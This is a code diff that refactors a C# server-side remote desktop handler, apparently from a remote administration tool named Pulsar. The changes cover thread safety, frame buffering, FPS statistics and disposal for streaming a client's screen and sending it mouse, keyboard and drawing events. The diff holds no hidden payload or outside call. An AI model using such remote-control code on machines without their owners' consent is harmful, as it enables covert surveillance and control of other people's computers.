@@ -6,12 +6,12 @@ using Pulsar.Common.Networking;
 using Pulsar.Common.Video.Codecs;
 using Pulsar.Server.Networking;
 using System;
+using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Collections.Concurrent;
 
 namespace Pulsar.Server.Messages
 {
@@ -23,34 +23,22 @@ namespace Pulsar.Server.Messages
         /// <summary>
         /// States if the client is currently streaming desktop frames.
         /// </summary>
-        public bool IsStarted { get; set; }
+        public bool IsStarted { get; private set; }
 
         /// <summary>
         /// Gets or sets whether the remote desktop is using buffered mode.
         /// </summary>
         public bool IsBufferedMode { get; set; } = true;
 
-        /// <summary>
-        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
-        /// </summary>
         private readonly object _syncLock = new object();
-
-        /// <summary>
-        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
-        /// </summary>
         private readonly object _sizeLock = new object();
 
-        /// <summary>
-        /// The local resolution, see <seealso cref="LocalResolution"/>.
-        /// </summary>
         private Size _localResolution;
 
         /// <summary>
-        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
+        /// Local resolution used to scale mouse/drawing coordinates.
+        /// Thread-safe.
         /// </summary>
-        /// <remarks>
-        /// This property is thread-safe.
-        /// </remarks>
         public Size LocalResolution
         {
             get
@@ -69,59 +57,41 @@ namespace Pulsar.Server.Messages
             }
         }
 
-        /// <summary>
-        /// Represents the method that will handle display changes.
-        /// </summary>
-        /// <param name="sender">The message processor which raised the event.</param>
-        /// <param name="value">All currently available displays.</param>
         public delegate void DisplaysChangedEventHandler(object sender, int value);
 
         /// <summary>
-        /// Raised when a display changed.
+        /// Raised when the client display configuration changes.
         /// </summary>
-        /// <remarks>
-        /// Handlers registered with this event will be invoked on the 
-        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
-        /// </remarks>
-        public event DisplaysChangedEventHandler DisplaysChanged;
+        public event DisplaysChangedEventHandler? DisplaysChanged;
 
-        /// <summary>
-        /// Reports changed displays.
-        /// </summary>
-        /// <param name="value">All currently available displays.</param>
         private void OnDisplaysChanged(int value)
         {
             SynchronizationContext.Post(val =>
             {
                 var handler = DisplaysChanged;
-                handler?.Invoke(this, (int)val);
+                handler?.Invoke(this, (int)val!);
             }, value);
         }
 
-        /// <summary>
-        /// The client which is associated with this remote desktop handler.
-        /// </summary>
         private readonly Client _client;
+        private UnsafeStreamCodec? _codec;
 
-        /// <summary>
-        /// The video stream codec used to decode received frames.
-        /// </summary>
-        private UnsafeStreamCodec _codec;        // buffer parameters
-        private readonly int _initialFramesRequested = 20; // request 20 frames initially for 60 FPS
-        private readonly int _defaultFrameRequestBatch = 15; // request 15 frames at a time for sustained 60 FPS
-        private int _pendingFrames = 0;
+        // Buffered frame request logic
+        private readonly int _initialFramesRequested = 20;
+        private readonly int _defaultFrameRequestBatch = 15;
+        private int _pendingFrames;
         private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);
-        private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();
-        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
-        private readonly int _fpsCalculationWindow = 10; // calculate FPS based on last 10 frames
 
+        // Stats / FPS
         private readonly Stopwatch _performanceMonitor = new Stopwatch();
-        private int _framesReceived = 0;
-        private double _estimatedFps = 0;
+        private int _framesReceivedForStats;
+        private double _estimatedFps;
+        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
+        private readonly int _fpsCalculationWindow = 10;
 
-        private long _accumulatedFrameBytes = 0;
-        private int _frameBytesSamples = 0;
-        private long _lastFrameBytes = 0;
+        private long _accumulatedFrameBytes;
+        private int _frameBytesSamples;
+        private long _lastFrameBytes;
 
         /// <summary>
         /// Size in bytes of the most recently received compressed frame.
@@ -141,43 +111,41 @@ namespace Pulsar.Server.Messages
             }
         }
 
-        /// <summary>
-        /// Stores the last FPS reported by the client.
-        /// </summary>
         private float _lastReportedFps = -1f;
 
         /// <summary>
-        /// Shows the last FPS reported by the client, or estimated FPS if not available.
+        /// Current FPS: prefers client-reported, falls back to estimated FPS.
         /// </summary>
         public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;
 
-        /// <summary>
-        /// Initializes a new instance of the <see cref="RemoteDesktopHandler"/> class using the given client.
-        /// </summary>
-        /// <param name="client">The associated client.</param>
         public RemoteDesktopHandler(Client client) : base(true)
         {
-            _client = client;
+            _client = client ?? throw new ArgumentNullException(nameof(client));
             _performanceMonitor.Start();
         }
 
-        /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetDesktopResponse || message is GetMonitorsResponse;
+        public override bool CanExecute(IMessage message) =>
+            message is GetDesktopResponse || message is GetMonitorsResponse;
 
-        /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
 
-        /// <inheritdoc />
         public override void Execute(ISender sender, IMessage message)
         {
-            switch (message)
+            try
             {
-                case GetDesktopResponse d:
-                    Execute(sender, d);
-                    break;
-                case GetMonitorsResponse m:
-                    Execute(sender, m);
-                    break;
+                switch (message)
+                {
+                    case GetDesktopResponse d:
+                        Execute(sender, d);
+                        break;
+                    case GetMonitorsResponse m:
+                        Execute(sender, m);
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"RemoteDesktopHandler.Execute error: {ex}");
             }
         }
 
@@ -189,35 +157,31 @@ namespace Pulsar.Server.Messages
         /// <summary>
         /// Begins receiving frames from the client using the specified quality and display.
         /// </summary>
-        /// <param name="quality">The quality of the remote desktop frames.</param>
-        /// <param name="display">The display to receive frames from.</param>
-        /// <param name="useGPU">Whether to use GPU for screen capture.</param>
         public void BeginReceiveFrames(int quality, int display, bool useGPU)
         {
             lock (_syncLock)
             {
                 IsStarted = true;
+
                 _codec?.Dispose();
                 _codec = null;
 
-                // Reset buffering counters
                 _pendingFrames = _initialFramesRequested;
                 ClearTimeStamps();
-                _framesReceived = 0;
-                _frameReceiptStopwatch.Restart();
-
-                // Start in buffered mode
-                _client.Send(new GetDesktop
-                {
-                    CreateNew = true,
-                    Quality = quality,
-                    DisplayIndex = display,
-                    Status = RemoteDesktopStatus.Start,
-                    UseGPU = useGPU,
-                    IsBufferedMode = IsBufferedMode,
-                    FramesRequested = _initialFramesRequested
-                });
+                _framesReceivedForStats = 0;
+                _performanceMonitor.Restart();
             }
+
+            _client.Send(new GetDesktop
+            {
+                CreateNew = true,
+                Quality = quality,
+                DisplayIndex = display,
+                Status = RemoteDesktopStatus.Start,
+                UseGPU = useGPU,
+                IsBufferedMode = IsBufferedMode,
+                FramesRequested = _initialFramesRequested
+            });
         }
 
         /// <summary>
@@ -231,7 +195,6 @@ namespace Pulsar.Server.Messages
             }
 
             Debug.WriteLine("Remote desktop session stopped");
-
             _client.Send(new GetDesktop { Status = RemoteDesktopStatus.Stop });
         }
 
@@ -244,167 +207,209 @@ namespace Pulsar.Server.Messages
             _client.Send(new GetMonitors());
         }
 
-        /// <summary>
-        /// Sends a mouse event to the specified display of the client.
-        /// </summary>
-        /// <param name="mouseAction">The mouse action to send.</param>
-        /// <param name="isMouseDown">Indicates whether it's a mousedown or mouseup event.</param>
-        /// <param name="x">The X-coordinate inside the <see cref="LocalResolution"/>.</param>
-        /// <param name="y">The Y-coordinate inside the <see cref="LocalResolution"/>.</param>
-        /// <param name="displayIndex">The display to execute the mouse event on.</param>
         public void SendMouseEvent(MouseAction mouseAction, bool isMouseDown, int x, int y, int displayIndex)
         {
+            UnsafeStreamCodec? codec;
+            Size localRes;
+
             lock (_syncLock)
             {
-                if (_codec == null) return;
-
-                _client.Send(new DoMouseEvent
-                {
-                    Action = mouseAction,
-                    IsMouseDown = isMouseDown,
-                    // calculate remote width & height
-                    X = x * _codec.Resolution.Width / LocalResolution.Width,
-                    Y = y * _codec.Resolution.Height / LocalResolution.Height,
-                    MonitorIndex = displayIndex
-                });
+                codec = _codec;
             }
+
+            if (codec == null)
+                return;
+
+            localRes = LocalResolution;
+            if (localRes.Width <= 0 || localRes.Height <= 0)
+                return;
+
+            int remoteX = x * codec.Resolution.Width / localRes.Width;
+            int remoteY = y * codec.Resolution.Height / localRes.Height;
+
+            _client.Send(new DoMouseEvent
+            {
+                Action = mouseAction,
+                IsMouseDown = isMouseDown,
+                X = remoteX,
+                Y = remoteY,
+                MonitorIndex = displayIndex
+            });
         }
 
-        /// <summary>
-        /// Sends a keyboard event to the client.
-        /// </summary>
-        /// <param name="keyCode">The pressed key.</param>
-        /// <param name="keyDown">Indicates whether it's a keydown or keyup event.</param>
         public void SendKeyboardEvent(byte keyCode, bool keyDown)
         {
             _client.Send(new DoKeyboardEvent { Key = keyCode, KeyDown = keyDown });
         }
 
-        /// <summary>
-        /// Sends a drawing event to the client.
-        /// </summary>
-        /// <param name="x">The X coordinate.</param>
-        /// <param name="y">The Y coordinate.</param>
-        /// <param name="prevX">The previous X coordinate.</param>
-        /// <param name="prevY">The previous Y coordinate.</param>
-        /// <param name="strokeWidth">The width of the stroke.</param>
-        /// <param name="colorArgb">The color in ARGB format.</param>
-        /// <param name="isEraser">True if using eraser, false for drawing.</param>
-        /// <param name="isClearAll">True to clear all drawings.</param>
-        /// <param name="displayIndex">The display index to draw on.</param>
-        public void SendDrawingEvent(int x, int y, int prevX, int prevY, int strokeWidth, int colorArgb, bool isEraser, bool isClearAll, int displayIndex)
+        public void SendDrawingEvent(int x, int y, int prevX, int prevY,
+            int strokeWidth, int colorArgb, bool isEraser, bool isClearAll, int displayIndex)
         {
+            UnsafeStreamCodec? codec;
+            Size localRes;
+
             lock (_syncLock)
             {
-                if (_codec == null || !IsStarted) return;
-
-                int remoteX = x * _codec.Resolution.Width / LocalResolution.Width;
-                int remoteY = y * _codec.Resolution.Height / LocalResolution.Height;
-                int remotePrevX = prevX * _codec.Resolution.Width / LocalResolution.Width;
-                int remotePrevY = prevY * _codec.Resolution.Height / LocalResolution.Height;
-
-                _client.Send(new DoDrawingEvent
-                {
-                    X = remoteX,
-                    Y = remoteY,
-                    PrevX = remotePrevX,
-                    PrevY = remotePrevY,
-                    StrokeWidth = strokeWidth,
-                    ColorArgb = colorArgb,
-                    IsEraser = isEraser,
-                    IsClearAll = isClearAll,
-                    MonitorIndex = displayIndex
-                });
+                codec = _codec;
             }
-        }        private async void Execute(ISender client, GetDesktopResponse message)
-        {
-            _framesReceived++;
 
-            // Capture the FPS reported by the client
-            if (message.FrameRate > 0 && message.FrameRate != _lastReportedFps)
+            if (codec == null || !IsStarted)
+                return;
+
+            localRes = LocalResolution;
+            if (localRes.Width <= 0 || localRes.Height <= 0)
+                return;
+
+            int remoteX = x * codec.Resolution.Width / localRes.Width;
+            int remoteY = y * codec.Resolution.Height / localRes.Height;
+            int remotePrevX = prevX * codec.Resolution.Width / localRes.Width;
+            int remotePrevY = prevY * codec.Resolution.Height / localRes.Height;
+
+            _client.Send(new DoDrawingEvent
+            {
+                X = remoteX,
+                Y = remoteY,
+                PrevX = remotePrevX,
+                PrevY = remotePrevY,
+                StrokeWidth = strokeWidth,
+                ColorArgb = colorArgb,
+                IsEraser = isEraser,
+                IsClearAll = isClearAll,
+                MonitorIndex = displayIndex
+            });
+        }
+
+        // ==============================
+        //   MAIN FRAME HANDLER
+        // ==============================
+        private void Execute(ISender client, GetDesktopResponse message)
+        {
+            // Fast exit if stream stopped
+            if (!IsStarted)
+                return;
+
+            // FPS from client
+            if (message.FrameRate > 0 && Math.Abs(message.FrameRate - _lastReportedFps) > 0.01f)
             {
                 _lastReportedFps = message.FrameRate;
                 Debug.WriteLine($"Client-reported FPS updated: {_lastReportedFps}");
             }
 
-            if (_performanceMonitor.ElapsedMilliseconds >= 1000)
+            // Account frame size stats (compressed)
+            if (message.Image != null && message.Image.Length > 0)
             {
-                _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
-                Debug.WriteLine($"Estimated FPS: {_estimatedFps:F1}, Client-reported FPS: {(_lastReportedFps > 0 ? _lastReportedFps.ToString("F1") : "N/A")}, Frames received: {_framesReceived}");
-                _framesReceived = 0;
-                _performanceMonitor.Restart();
+                long size = message.Image.LongLength;
+                Interlocked.Exchange(ref _lastFrameBytes, size);
+                Interlocked.Add(ref _accumulatedFrameBytes, size);
+                Interlocked.Increment(ref _frameBytesSamples);
             }
+
+            UnsafeStreamCodec? codecSnapshot;
+            bool shouldDecode;
 
             lock (_syncLock)
             {
-                if (!IsStarted)
+                if (!IsStarted || message.Image == null || message.Image.Length == 0)
+                {
+                    Interlocked.Decrement(ref _pendingFrames);
                     return;
+                }
 
-                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
+                if (_codec == null ||
+                    _codec.ImageQuality != message.Quality ||
+                    _codec.Monitor != message.Monitor ||
+                    _codec.Resolution != message.Resolution)
                 {
                     _codec?.Dispose();
                     _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
+                    Debug.WriteLine($"RemoteDesktop codec reinitialized: Q={message.Quality}, M={message.Monitor}, Res={message.Resolution}");
                 }
 
-                if (message.Image != null)
-                {
-                    long size = message.Image.LongLength;
-                    Interlocked.Exchange(ref _lastFrameBytes, size);
-                    Interlocked.Add(ref _accumulatedFrameBytes, size);
-                    Interlocked.Increment(ref _frameBytesSamples);
-                }
-
-                using (var ms = new MemoryStream(message.Image))
-                {
-                    try
-                    {
-                        var decoded = _codec.DecodeData(ms);
-                        if (decoded != null)
-                        {
-                            EnsureLocalResolutionInitialized(decoded.Size);
-                            OnReport(decoded);
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error decoding frame: {ex.Message}");
-                    }
-                }
-
-                message.Image = null;
-
-                long serverTimestamp = Stopwatch.GetTimestamp();
-                _frameTimestamps.Enqueue(serverTimestamp);
-                
-                if (_framesReceived % _fpsCalculationWindow == 0)
-                {
-                    double elapsedSeconds = _performanceMonitor.Elapsed.TotalSeconds;
-                    _estimatedFps = _framesReceived / elapsedSeconds;
-                    
-                    if (_framesReceived >= 100)
-                    {
-                        _framesReceived = 0;
-                        _performanceMonitor.Restart();
-                    }
-                }
-                
-                while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }
-
-                Interlocked.Decrement(ref _pendingFrames);
+                codecSnapshot = _codec;
+                shouldDecode = codecSnapshot != null;
             }
 
-            if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 8))
+            if (!shouldDecode || codecSnapshot == null)
             {
-                await RequestMoreFramesAsync();
+                Interlocked.Decrement(ref _pendingFrames);
+                return;
+            }
+
+            Bitmap? decoded = null;
+
+            try
+            {
+                using (var ms = new MemoryStream(message.Image, writable: false))
+                {
+                    decoded = codecSnapshot.DecodeData(ms);
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error decoding frame: {ex.Message}");
+            }
+            finally
+            {
+                // allow GC to reclaim buffer
+                message.Image = null;
+            }
+
+            if (!IsStarted)
+            {
+                decoded?.Dispose();
+                Interlocked.Decrement(ref _pendingFrames);
+                return;
+            }
+
+            if (decoded != null)
+            {
+                EnsureLocalResolutionInitialized(decoded.Size);
+
+                // Count frame for stats
+                _framesReceivedForStats++;
+                if (_performanceMonitor.ElapsedMilliseconds >= 1000)
+                {
+                    double seconds = _performanceMonitor.ElapsedMilliseconds / 1000.0;
+                    if (seconds > 0.001)
+                    {
+                        _estimatedFps = _framesReceivedForStats / seconds;
+                    }
+
+                    Debug.WriteLine(
+                        $"Estimated FPS: {_estimatedFps:F1}, Client FPS: {(_lastReportedFps > 0 ? _lastReportedFps.ToString("F1") : "N/A")}, Frames (stat window): {_framesReceivedForStats}");
+
+                    _framesReceivedForStats = 0;
+                    _performanceMonitor.Restart();
+                }
+
+                // Track timestamps lightly (you can expand if you want window-based FPS)
+                long ts = Stopwatch.GetTimestamp();
+                _frameTimestamps.Enqueue(ts);
+                while (_frameTimestamps.Count > _fpsCalculationWindow &&
+                       _frameTimestamps.TryDequeue(out _)) { }
+
+                // Push frame to UI via MessageProcessorBase<Bitmap> (ProgressChanged in your form)
+                OnReport(decoded);
+            }
+            else
+            {
+                Debug.WriteLine("Decoded frame was null.");
+            }
+
+            Interlocked.Decrement(ref _pendingFrames);
+
+            // Request more frames if needed (buffered mode)
+            if (IsBufferedMode &&
+                (message.IsLastRequestedFrame || Volatile.Read(ref _pendingFrames) <= 8))
+            {
+                _ = RequestMoreFramesAsync();
             }
         }
 
         private void EnsureLocalResolutionInitialized(Size fallbackSize)
         {
             if (fallbackSize.Width <= 0 || fallbackSize.Height <= 0)
-            {
                 return;
-            }
 
             var current = LocalResolution;
             if (current.Width <= 0 || current.Height <= 0)
@@ -413,38 +418,63 @@ namespace Pulsar.Server.Messages
             }
         }
 
+        /// <summary>
+        /// Requests more frames in buffered mode.
+        /// Runs fully async and never blocks the UI thread.
+        /// </summary>
         private async Task RequestMoreFramesAsync()
         {
-            if (!await _frameRequestSemaphore.WaitAsync(10))
+            if (!IsStarted)
+                return;
+
+            if (!await _frameRequestSemaphore.WaitAsync(10).ConfigureAwait(false))
                 return;
 
             try
             {
+                if (!IsStarted)
+                    return;
+
                 int batchSize = _defaultFrameRequestBatch;
 
-                if (_estimatedFps > 40)
+                // Simple adaptive batching based on estimated FPS
+                double fps = _estimatedFps;
+                if (fps > 40)
                     batchSize = 20;
-                else if (_estimatedFps > 30)
+                else if (fps > 30)
                     batchSize = 15;
-                else if (_estimatedFps > 20)
+                else if (fps > 20)
                     batchSize = 10;
-                else if (_estimatedFps > 10)
+                else if (fps > 10)
                     batchSize = 5;
                 else
                     batchSize = 3;
 
-                Debug.WriteLine($"Requesting {batchSize} more frames (estimated FPS: {_estimatedFps:F1})");
+                UnsafeStreamCodec? codecSnapshot;
+                lock (_syncLock)
+                {
+                    codecSnapshot = _codec;
+                }
+
+                int quality = codecSnapshot?.ImageQuality ?? 75;
+                int monitor = codecSnapshot?.Monitor ?? 0;
+
+                Debug.WriteLine($"Requesting {batchSize} more frames (estimated FPS: {fps:F1})");
                 Interlocked.Add(ref _pendingFrames, batchSize);
 
                 _client.Send(new GetDesktop
                 {
                     CreateNew = false,
-                    Quality = _codec?.ImageQuality ?? 75,
-                    DisplayIndex = _codec?.Monitor ?? 0,
+                    Quality = quality,
+                    DisplayIndex = monitor,
                     Status = RemoteDesktopStatus.Continue,
                     IsBufferedMode = true,
                     FramesRequested = batchSize
                 });
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"RequestMoreFramesAsync error: {ex}");
             }
             finally
             {
@@ -457,9 +487,6 @@ namespace Pulsar.Server.Messages
             OnDisplaysChanged(message.Number);
         }
 
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
-        /// </summary>
         public void Dispose()
         {
             Dispose(true);
@@ -468,15 +495,27 @@ namespace Pulsar.Server.Messages
 
         protected virtual void Dispose(bool disposing)
         {
-            if (disposing)
+            if (!disposing)
+                return;
+
+            lock (_syncLock)
             {
-                lock (_syncLock)
+                IsStarted = false;
+
+                try
                 {
                     _codec?.Dispose();
-                    _frameRequestSemaphore?.Dispose();
-                    IsStarted = false;
                 }
+                catch { }
+
+                _codec = null;
             }
+
+            try
+            {
+                _frameRequestSemaphore.Dispose();
+            }
+            catch { }
         }
     }
 }
